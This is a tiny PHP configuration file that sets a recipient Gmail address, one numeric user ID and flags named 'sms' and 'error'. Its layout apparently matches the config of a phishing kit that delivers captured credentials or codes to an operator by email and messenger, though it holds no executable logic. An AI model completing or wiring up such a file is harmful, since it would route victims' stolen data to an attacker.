<?php
$send = "bahadrem12@gmail.com";
$user_ids=array("998162381");
$sms='1';
$error='1';
?>
